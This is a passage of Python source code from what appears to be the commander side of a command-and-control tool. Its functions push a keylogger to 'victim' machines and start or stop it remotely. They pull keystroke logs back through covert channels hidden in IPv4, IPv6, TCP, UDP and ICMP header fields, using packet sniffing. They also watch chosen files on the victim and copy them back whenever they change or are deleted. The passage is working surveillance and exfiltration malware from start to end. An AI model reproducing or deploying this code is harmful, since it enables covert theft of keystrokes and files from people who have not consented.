                                     for packet in received_packets if packet_callback(packet))

            # Write Data to File
            covert_data_write_to_file(extracted_data, save_file_path)

            # Send ACK to victim (if good)
            if is_file_openable(save_file_path):
                print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
                client_socket.send(constants.VICTIM_ACK.encode())
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            else:
                client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None

        else:  # If file does not exist...
            print(constants.GET_FILE_NOT_EXIST_MSG.format(file_path, client_ip, client_port))
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
    else:
        print(constants.GET_FILE_ERROR)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None


def receive_keylog_file_covert(client_socket: socket.socket,
                               client_ip: str,
                               client_port: int,
                               source_ip: str,
                               source_port: int,
                               choices: tuple,
                               save_file_path: str,
                               file_name: str):
    """
    A different version from the regular receive_file_covert(),
    but specifically deals with the receiving of saved keylogged
    files from victim.

    @param client_socket:
        The target/victim socket

    @param client_ip:
        The target/victim's IP address

    @param client_port:
        The target/victim's port number

    @param source_port:
        The commander's port number

    @param choices:
        A tuple containing the covert channel configuration
        (header/field)

    @param save_file_path:
        A string representing the file path of keylog .txt file in the current directory

    @param file_name:
        A string containing the file name

    @return: None
    """
    # CHECK: If destination field choice, do nothing
    if constants.DESTINATION_ADDRESS_FIELD in choices:
        __transfer_file_dst_addr_error_handler(choices[1], choices[0])
        return None

    # Initialize Map and variables
    received_packets = []
    header_field_function_map = get_protocol_header_function_extract_map()

    if choices in header_field_function_map:
        selected_function = header_field_function_map.get(choices)

    # A callback function for handling of received packets
    def packet_callback(packet):
        global filename
        binary_data = selected_function(packet)
        return binary_data

    # DIFFERENT SNIFFS: For IPv4 Headers/Field
    if constants.IPV4 in choices:
        # Get total count of packets
        count = get_packet_count(client_socket)

        if constants.SOURCE_ADDRESS_FIELD in choices:
            received_packets = sniff(filter="dst host {} and dst port {}"
                                     .format(source_ip, source_port), count=count)
        else:  # REGULAR IPv4 SNIFF
            received_packets = sniff(filter="src host {}".format(client_ip), count=count)

    # DIFFERENT SNIFFS: For IPv6 Headers/Field
    if constants.IPV6 in choices:
        # Get own IPv6 address and port
        source_ipv6_ip, source_ipv6_port = determine_ipv6_address()

        # Transfer ipv6_getter.py file to victim/target and get their IPv6 address
        victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port)

        # Send own IPv6 address and port
        client_socket.send((source_ipv6_ip + "/" + str(source_ipv6_port)).encode())

        # Get total count of packets
        count = get_packet_count(client_socket)

        if constants.NEXT_HEADER in choices:
            received_packets = sniff(filter="src host {} and dst host {}"
                                     .format(victim_ipv6_addr, source_ipv6_ip),
                                     count=count)
        else:
            received_packets = sniff(filter="dst host {} and dst port {}"
                                     .format(source_ipv6_ip, source_ipv6_port),
                                     count=count)

    # DIFFERENT SNIFFS: For TCP Headers/Field
    if constants.TCP in choices:
        count = get_packet_count(client_socket)

        if constants.SOURCE_PORT_FIELD in choices:
            received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
                                            "(tcp[13] & 0x004 == 0)"  # tcp[13] offset RST flag (0x004)
                                     .format(source_ip, source_port),
                                     count=count)

        elif constants.DESTINATION_PORT_FIELD in choices:
            received_packets = sniff(filter="tcp and dst host {} and src host {} and "
                                            "(tcp[13] & 0x004 == 0)"
                                     .format(source_ip, client_ip),
                                     count=count)

        elif constants.FLAG in choices:  # Capture all flags
            received_packets = sniff(filter="tcp and dst host {} and dst port {}"
                                     .format(source_ip, source_port),
                                     count=count)
        else:
            received_packets = sniff(filter="tcp and dst host {} and dst port {} "
                                            "and tcp[13] & 0x004 == 0"
                                     .format(source_ip, source_port),
                                     count=count)

    # DIFFERENT SNIFFS: For UDP Headers/Field
    if constants.UDP in choices:
        count = get_packet_count(client_socket)

        if constants.DESTINATION_PORT_FIELD in choices:
            received_packets = sniff(filter="udp and dst host {} and src host {}"
                                     .format(source_ip, client_ip),
                                     count=count)
        else:
            received_packets = sniff(filter="udp and dst host {} and dst port {}"
                                     .format(source_ip, source_port),
                                     count=count)

    # DIFFERENT SNIFFS: For ICMP Header/Fields
    if constants.ICMP in choices:
        count = get_packet_count(client_socket)

        received_packets = sniff(filter="icmp and dst host {} and src host {}"
                                 .format(source_ip, client_ip),
                                 count=count)

    # Extract Data
    extracted_data = ''.join(packet_callback(packet)
                             for packet in received_packets if packet_callback(packet))

    # Write Data to File
    covert_data_write_to_file(extracted_data, save_file_path)

    # Send ACK to victim (if good)
    if is_file_openable(save_file_path):
        print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
        client_socket.send(constants.VICTIM_ACK.encode())
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None
    else:
        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None

# // ===================================== END OF COVERT CHANNEL FUNCTIONS ===================================== //


def is_file_openable(file_path):
    try:
        with open(file_path, constants.READ_MODE) as file:
            pass
        return True
    except IOError as e:
        print(constants.FILE_CANNOT_OPEN_ERROR.format(file_path, e))
        return False


def __is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: str):
    if status:
        print(error_msg.format(client_ip, client_port))
        print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
        return True
    else:
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return False


def is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: str):
    if status:
        print(error_msg.format(client_ip, client_port))
        print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return True
    else:
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return False


def is_watching(status: bool, client_ip: str, client_port: int, error_msg: str):
    if status:
        print(error_msg.format(client_ip, client_port))
        print(constants.WATCH_STATUS_TRUE_ERROR_SUGGEST)
        return True
    else:
        return False


def __receive_keylog_files(client_socket: socket.socket, dest_ip: str, dest_port: int,
                           source_ip: str, source_port: int, choices: tuple,
                           sub_directory_path: str, number_of_files: int):
    """
    Receives any recorded keylog .txt files from the client/victim

    :param client_socket:
            The client socket

    :param number_of_files:
            An integer representing the number of .txt files on client/victim side

    :param sub_directory_path:
            A string containing the "/download/[IP_address]" path

    :return: None
    """

    for i in range(int(number_of_files)):
        # Get file name
        file_name = client_socket.recv(constants.BYTE_LIMIT).decode()
        print(constants.RECEIVING_FILE_MSG.format(file_name))

        # Send choice (header/field) for covert channel
        client_socket.send((choices[0] + "/" + choices[1]).encode())

        # Create a new file path under downloads/client_ip/____.txt
        file_path = os.path.join(sub_directory_path, file_name)

        receive_keylog_file_covert(client_socket, dest_ip, dest_port, source_ip,
                                   source_port, choices, file_path, file_name)


def find_specific_client_socket(client_dict: dict,
                                target_ip: str,
                                target_port: int):
    try:
        # Initialize Variables
        target_socket = None
        is_keylog = False
        is_watching_file = False

        # Check target_ip and target_port
        ipaddress.ip_address(target_ip)

        # Find a specific client socket from client socket list to send data to
        for client_sock, client_info in client_dict.items():
            if client_info[:2] == (target_ip, target_port):
                target_socket = client_sock
                is_keylog = client_info[2]
                is_watching_file = client_info[3]
                break

        # Check if target_socket is not None and return
        if target_socket:
            return target_socket, target_ip, target_port, is_keylog, is_watching_file
        else:
            return None, None, None, None, None

    except ValueError as e:
        print(constants.INVALID_INPUT_ERROR.format(e))
        return None, None, None, None, None


def perform_menu_item_3(client_dict: dict):
    # CASE 1: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_dict.items()))

        # Check if target socket is currently running keylogger
        if __is_keylogging(status, client_ip, client_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        # Check if file/directory watching
        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        transfer_keylog_program(client_socket, client_ip, client_port)

    # CASE 3: Send keylogger to any specific connected victim
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)

        # Check if target socket is currently running keylogger
        if __is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        # Check if file/directory watching
        if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        if target_socket:
            transfer_keylog_program(target_socket, target_ip, target_port)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


def perform_menu_item_1(client_dict: dict):
    print(constants.START_KEYLOG_INITIAL_MSG)

    # a) CASE: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.CLIENT_LIST_EMPTY_ERROR)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

    # b) CASE: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        # Get client socket
        client_socket, (ip, port, status, status_2) = next(iter(client_dict.items()))

        if __is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        if is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        else:
            __perform_menu_item_1_helper(client_socket, client_dict, ip, port, status_2)

    # c) CASE: Handle any specific connected client in client list
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
        target_port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)
        if target_socket:
            if __is_keylogging(status, target_ip, target_port, constants.KEYLOG_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            else:
                __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port, status_2)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


def __perform_menu_item_1_helper(client_socket: socket.socket, client_dict: dict,
                                 ip: str, port: int, is_watching: bool):
    # Send signal to start keylog
    print(constants.START_SEND_SIGNAL_MSG.format(constants.KEYLOG_FILE_NAME, ip, port))
    client_socket.send(constants.START_KEYLOG_MSG.encode())

    # Await OK signal from client
    print(constants.AWAIT_START_RESPONSE_MSG)
    ack = client_socket.recv(constants.BYTE_LIMIT).decode()

    #  i) Check if keylogger.py is in victim's directory
    try:
        if ack == constants.RECEIVED_CONFIRMATION_MSG:
            print(constants.START_SIGNAL_RECEIVED_MSG.format(constants.KEYLOG_FILE_NAME))
            client_socket.send(constants.CHECK_KEYLOG.encode())

            print(constants.START_SIGNAL_SEND_FILE_NAME.format(constants.KEYLOG_FILE_NAME))
            client_socket.send(constants.KEYLOG_FILE_NAME.encode())

            # Get status
            print(constants.AWAIT_START_RESPONSE_MSG)
            status = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
            msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

            if status == constants.STATUS_TRUE:
                print(constants.CLIENT_RESPONSE.format(msg))

                # Send signal to victim to start
                print(constants.START_SIGNAL_EXECUTE_KEYLOG.format(constants.KEYLOG_FILE_NAME))
                client_socket.send(constants.START_KEYLOG_MSG.encode())

                # Awaiting Response
                msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
                print(constants.CLIENT_RESPONSE.format(msg))

                # Replace the keylog status of the client in client dictionary to True
                client_dict[client_socket] = (ip, port, True, is_watching)

                print(constants.STOP_KEYLOG_SUGGESTION_MSG.format(ip, port))
            else:
                print(constants.CLIENT_RESPONSE.format(msg))
                print(constants.MISSING_KEYLOG_FILE_SUGGEST_MSG)

        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

    except Exception as e:
        print(constants.KEYLOG_FILE_CHECK_ERROR.format(constants.KEYLOG_FILE_NAME, e))


def perform_menu_item_2(client_dict: dict):
    print(constants.STOP_KEYLOG_INITIAL_MSG)

    # a) CASE: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.CLIENT_LIST_EMPTY_ERROR)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

    # b) CASE: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        # Get client socket
        client_socket, (ip, port, status, status_2) = next(iter(client_dict.items()))
        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, status, status_2)

    # c) CASE: Handle for clients greater than 1
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_STOP_KEYLOG)
        target_port = int(input(constants.ENTER_TARGET_PORT_STOP_KEYLOG))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)

        if target_socket:
            __perform_menu_item_2_helper(client_dict, target_socket,
                                         target_ip, target_port, status, status_2)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)


def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket,
                                 target_ip: str, target_port: int, status: bool,
                                 status_2: bool):
    # Check watching status
    if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None

    # Check keylog status
    if not __is_keylogging(status, target_ip, target_port, constants.STOP_KEYLOG_STATUS_FALSE):
        print(constants.STOP_KEYLOG_STATUS_FALSE.format(target_ip, target_port))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None
    else:
        # Get signal from user to stop keylog on client/victim side
        signal_to_stop = constants.ZERO
        print(constants.STOP_KEYLOGGER_PROMPT)

        while True:
            try:
                signal_to_stop = int(input())
                if signal_to_stop == constants.PERFORM_MENU_ITEM_TWO:
                    client_socket.send(constants.STOP_KEYWORD.encode())
                    break
                print(constants.INVALID_INPUT_STOP_KEYLOGGER)
            except ValueError as e:
                print(constants.INVALID_INPUT_STOP_KEYLOGGER)

        # Await Results from keylogger on client/victim side (BLOCKING CALL)
        result = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")
        result_status = result[0]
        result_msg = result[1]

        if result_status == constants.STATUS_TRUE:
            print(constants.CLIENT_RESPONSE.format(result_msg))
            print(constants.KEYLOG_OPERATION_SUCCESSFUL)

            # Update client status
            client_dict[client_socket] = (target_ip, target_port, False, status_2)
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
        else:
            print(constants.STOP_KEYLOG_RESULT_ERROR.format(result_msg))
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)


def __make_main_and_sub_directories(client_ip: str):
    main_directory = constants.DOWNLOADS_DIR
    sub_directory = str(client_ip)

    # Create the main directory (if it doesn't exist)
    if not os.path.exists(main_directory):
        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
        os.mkdir(main_directory)
        print(constants.DIRECTORY_SUCCESS_MSG)

    # Get subdirectory path (downloads/[IP_addr])
    sub_directory_path = os.path.join(main_directory, sub_directory)

    # Create subdirectory (if it doesn't exist)
    if not os.path.exists(sub_directory_path):
        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
        os.mkdir(sub_directory_path)
        print(constants.DIRECTORY_SUCCESS_MSG)

    return sub_directory_path


def perform_menu_item_4(client_dict: dict, source_ip: str, source_port: int):
    # CASE 1: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_dict.items()))

        # Check status
        if __is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        else:
            choices = protocol_and_field_selector()
            __perform_menu_item_4_helper(client_socket, client_ip, client_port, source_ip, source_port, choices)

    # CASE 3: Handle a specific client/victim (or if multiple clients)
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_GET_FILES)
        target_port = int(input(constants.ENTER_TARGET_PORT_GET_FILES))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)

        if target_socket:
            if __is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            else:
                choices = protocol_and_field_selector()
                __perform_menu_item_4_helper(target_socket, target_ip, target_port, source_ip, source_port, choices)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)


def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str,
                                 client_port: int, source_ip: str, source_port: int,
                                 choices: tuple):

    # Send to victim a notification that it is wanting to receive keylog files
    print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
    client_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())

    # Await response if there are any .txt files to transfer
    print(constants.GET_KEYLOG_PROCESS_MSG.format(client_ip, client_port))
    response = client_socket.recv(constants.BYTE_LIMIT).decode().split('/')
    response_status = response[0]
    response_msg = response[1]
    number_of_files = response[2]
    print(constants.CLIENT_RESPONSE.format(response_msg))

    # If present, then create directory (eg: downloads/127.0.0.1) and start file transfer
    if response_status == constants.STATUS_TRUE:
        sub_directory_path = __make_main_and_sub_directories(client_ip)

        # Send commander port number to target/victim
        client_socket.send((str(source_port)).encode())

        # GET files from target to commander
        __receive_keylog_files(client_socket, client_ip, client_port, source_ip, source_port,
                               choices, sub_directory_path, int(number_of_files))

        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
    else:
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)


def create_file_name(file_path: str):
    # Get system date and time (Format: {file_name}_{Date}_{Time}_AM/PM)
    current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %I-%M-%S %p")

    # Replace spaces with underscores if needed
    current_datetime = current_datetime.replace(" ", "_")

    # Parse file_path for actual file name
    parsed_file_path = file_path.split("/")
    file_name = parsed_file_path[-1].split('.')
    extension = file_name[1]

    # Append new file name with date + time
    file_name = f"{parsed_file_path[-1].split('.')[0]}_{current_datetime}.{extension}"
    return file_name


def __process_deletion_timeout(client_ip,
                               client_list,
                               client_port,
                               client_socket,
                               file_path,
                               is_keylog,
                               signal_queue: queue.Queue):
    # Print Termination Statements
    print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
    print(constants.WATCH_FILE_THREAD_TERMINATING)

    # Reset is_watching_file flag to default (False)
    client_list[client_socket] = (client_ip, client_port, is_keylog, False)

    # Reset SetTimeOut Timer (to prevent disconnection)
    client_socket.settimeout(None)

    # Send signal to signal_queue to notify main() that global_thread has stopped
    signal_queue.put(constants.STOP_KEYWORD)

    # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
    client_socket.send(constants.STOP_KEYWORD.encode())
    print(constants.THREAD_STOPPED_MSG)


def watch_file_client_socket(client_socket: socket.socket,
                             signal_queue: queue.Queue,
                             file_path: str,
                             sub_directory_path: str,
                             client_list: dict,
                             client_ip: str,
                             client_port: int,
                             is_keylog: bool):
    while True:
        try:
            # Check if a stop signal is received; remove signal from queue and send signal to client
            if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                client_socket.send(constants.STOP_KEYWORD.encode())
                break

            # Get Event from Client
            event = client_socket.recv(20).decode()

            # MODIFY: Get File If Modified
            if event == "IN_MODIFY":
                file_name = create_file_name(file_path)
                new_file_path = sub_directory_path + "/" + file_name

                # Receive Modified File
                with open(new_file_path, "wb") as file:
                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker

                    while True:
                        file_data = client_socket.recv(1024)
                        if not file_data:
                            break  # No more data received
                        if file_data.endswith(eof_marker):
                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                            break
                        else:
                            file.write(file_data)

                if is_file_openable(new_file_path):
                    print(constants.WATCH_FILE_TRANSFER_SUCCESS_MODIFY.format(file_name))
                else:
                    print(constants.FILE_TRANSFER_ERROR)

            # DELETED: Move File to Deleted Directory (as Backup)
            if event == "IN_DELETE" or event == "IN_DELETE_SELF":
                file_name = create_file_name(file_path)

                # Check if a "deleted" directory exists, if not, create a deleted folder
                deleted_dir_path = sub_directory_path + "/" + constants.DELETED_DIRECTORY
                if not os.path.exists(deleted_dir_path):
                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(deleted_dir_path))
                    os.mkdir(deleted_dir_path)
                    print(constants.DIRECTORY_SUCCESS_MSG)

                # Generate new file path
                deleted_file_path = deleted_dir_path + "/" + file_name

                # Receive Modified File
                with open(deleted_file_path, "wb") as file:
                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker

                    while True:
                        file_data = client_socket.recv(1024)
                        if not file_data:
                            break  # No more data received
                        if file_data.endswith(eof_marker):
                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                            break
                        else:
                            file.write(file_data)

                if is_file_openable(deleted_file_path):
                    print(constants.WATCH_FILE_TRANSFER_SUCCESS_DELETION.format(file_name))
                else:
                    print(constants.FILE_TRANSFER_ERROR)

                # Set socket timeout (for 5 seconds) because there is no more file to watch!
                client_socket.settimeout(5)

        except socket.timeout:
            __process_deletion_timeout(client_ip, client_list, client_port,
                                       client_socket, file_path, is_keylog,
                                       signal_queue)
            return None

        except TimeoutError:
            __process_deletion_timeout(client_ip, client_list, client_port,
                                       client_socket, file_path, is_keylog,
                                       signal_queue)
            return None

    # Set WATCH_FILE status to false (Before ending thread)
    client_list[client_socket] = (client_ip, client_port, is_keylog, False)
    print(constants.WATCH_FILE_THREAD_STOP)
    print(constants.WATCH_FILE_THREAD_STOP_SUCCESS)


def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket,
                                 target_ip: str, target_port: int, status: bool,
                                 status_2: bool, global_thread: None,
                                 signal_queue: queue.Queue):
    # Check if currently keylogging
    if __is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return global_thread

    # Check if currently watching a file
    if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return global_thread
    else:
        # Send the notification to the victim that commander wants to watch a file
        client_socket.send(constants.WATCH_FILE_SIGNAL.encode())

        # Prompt user input + send file path to victim
        filename = input("[+] Enter the path of the file to watch: ")
        client_socket.send(filename.encode())

        # Get Response
        res = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")

        # Logic
        if res[0] == constants.STATUS_TRUE:
            print(constants.CLIENT_RESPONSE.format(res[1]))
            print("[+] Now watching file {} from client ({}, {})...".format(filename,
                                                                            target_ip,
                                                                            target_port))

            # a) Create downloads/victim_ip directory (if necessary)
            sub_directory_path = __make_main_and_sub_directories(target_ip)

            # b) Update state of socket to is_watching
            client_dict[client_socket] = (target_ip, target_port, status, True)

            # c) Check signal queue if thread has stopped due to a previous deletion event
            if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                global_thread = None

            # d) Create + Start a thread to monitor client socket and handle modify/deleted files
            if global_thread is None:
                global_thread = threading.Thread(target=watch_file_client_socket,
                                                 args=(client_socket,
                                                       signal_queue,
                                                       filename,
                                                       sub_directory_path,
                                                       client_dict,
                                                       target_ip,
                                                       target_port,
                                                       status),
                                                 name="Watch_File_Client_Socket")
                global_thread.daemon = True
                global_thread.start()
                print(constants.THREAD_START_MSG.format(global_thread.name))
                return global_thread
        else:
            print(constants.CLIENT_RESPONSE.format(res[1]))
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return global_thread


def perform_menu_item_9(client_list: dict, global_thread: None, signal_queue: queue.Queue):
    print(constants.START_WATCH_FILE_MSG)

    # CASE 1: Check if client list is empty
    if len(client_list) == constants.ZERO:
        print(constants.WATCH_FILE_NO_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_list) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_list.items()))
        global_thread = __perform_menu_item_9_helper(client_list, client_socket, client_ip, client_port,
                                                     status, status_2, global_thread, signal_queue)
        return global_thread

    # CASE 3: [Multiple Clients] - Watch File for a specific connected victim
    elif len(client_list) != constants.ZERO:
        ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
        port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
        (target_socket, ip, port, status, status_2) = find_specific_client_socket(client_list,
                                                                                  ip, port)

        if target_socket:
            if __is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return global_thread
            if is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return global_thread
            else:
                print("[+] PENDING IMPLEMENTATION: Watch File for multiple clients is "
                      "under development!")
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)

    # Print closing statements
    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)
    return global_thread


def __perform_menu_item_11_helper(target_ip: str, target_port: int,
                                  global_thread: threading.Thread,
                                  signal_queue: queue.Queue):
    try:
        # a) Stop Thread + Signal to client + Update Status
        if global_thread is not None:
            print(constants.THREAD_STOPPING_MSG.format(global_thread.name))
            print(constants.STOP_WATCH_FILE_TIP.format(target_ip, target_port))
            signal_queue.put(constants.STOP_KEYWORD)

            # Wait for thread to finish
            global_thread.join()
            print(constants.THREAD_STOPPED_MSG)

            # Set and return global thread to None
            global_thread = None
            return global_thread

    except KeyboardInterrupt:
        # Wait for thread to finish
        global_thread.join()

        # Set global thread to None
        global_thread = None
        print(constants.KEYBOARD_INTERRUPT_MSG)
        print(constants.STOP_WATCH_THREAD_CONCURRENCY_WARNING.format(target_ip, target_port))
        return global_thread


def perform_menu_item_11(client_list: dict,
                         global_thread: None,
                         signal_queue: queue.Queue):
    print(constants.STOP_WATCH_FILE_MSG)

    # CASE 1: Check if client list is empty
    if len(client_list) == constants.ZERO:
        print(constants.STOP_WATCH_FILE_NO_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_list) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_list.items()))

        # Check if currently keylogging
        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        # Check if currently watching a file
        if status_2:
            __perform_menu_item_11_helper(client_ip, client_port, global_thread, signal_queue)
        else:
            print(constants.NOT_WATCHING_FILE_ERROR)

    # CASE 3: [Multiple Clients] Watch File for a specific connected victim
    elif len(client_list) != constants.ZERO:
        ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
        port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
